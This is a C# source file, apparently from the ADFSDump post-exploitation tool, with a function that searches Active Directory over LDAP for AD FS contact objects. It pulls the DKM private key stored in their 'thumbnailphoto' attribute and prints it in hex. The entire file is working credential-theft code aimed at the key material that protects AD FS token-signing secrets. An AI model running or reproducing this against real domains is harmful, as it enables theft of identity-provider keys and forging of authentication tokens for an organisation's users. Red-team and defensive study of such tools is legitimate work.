using System;
using System.DirectoryServices;
using System.Collections.Generic;

namespace ADFSDump.ActiveDirectory
{
    public static class ADSearcher
    {
        private const string LdapFilter = "(&(thumbnailphoto=*)(objectClass=contact)(!(cn=CryptoPolicy)))";

        public static List<string> GetPrivKey(Dictionary<string, string> arguments)
        {
            var keys = new List<string>();

            string username = arguments.ContainsKey("/username") ? arguments["/username"] : "";
            string password = arguments.ContainsKey("/password") ? arguments["/password"] : "";
            bool runAsUser = false;
            if (!string.IsNullOrEmpty(username))
            {
                if (string.IsNullOrEmpty(password))
                {
                    Log.Status("[!] If you provide a username, you must provide a password!");
                    return keys;
                }
                runAsUser = true;
            }

            // Domain, server and credentials are independent of one another.
            string domain = arguments.ContainsKey("/domain")
                ? arguments["/domain"]
                : System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;
            string searchString = arguments.ContainsKey("/server")
                ? string.Format("LDAP://{0}/", arguments["/server"])
                : "LDAP://";

            Log.Status("## Extracting Private Key from Active Directory Store");
            Log.Status($"[-] Domain is {domain}");

            string[] domainParts = domain.Split('.');
            List<string> searchBase = new List<string> { "CN=ADFS", "CN=Microsoft", "CN=Program Data" };
            foreach (string part in domainParts)
            {
                searchBase.Add($"DC={part}");
            }

            string ldap = $"{searchString}{string.Join(",", searchBase.ToArray())}";

            try
            {
                DirectoryEntry entry = runAsUser
                    ? new DirectoryEntry(ldap, username, password)
                    : new DirectoryEntry(ldap);
                using (DirectorySearcher mySearcher = new DirectorySearcher(entry))
                {
                    mySearcher.Filter = LdapFilter;
                    mySearcher.PropertiesToLoad.Add("thumbnailphoto");
                    foreach (SearchResult resEnt in mySearcher.FindAll())
                    {
                        byte[] privateKey = (byte[])resEnt.Properties["thumbnailphoto"][0];
                        string convertedPrivateKey = BitConverter.ToString(privateKey);
                        keys.Add(convertedPrivateKey);
                        Log.Data("[-] Private Key: {0}\r\n", convertedPrivateKey);
                    }
                }
            }
            catch (Exception e)
            {
                Log.Status("!!! Exception getting private key: {0}", e);
                Log.Status("!!! Are you sure you are running as the AD FS service account?");
            }

            return keys;
        }
    }
}
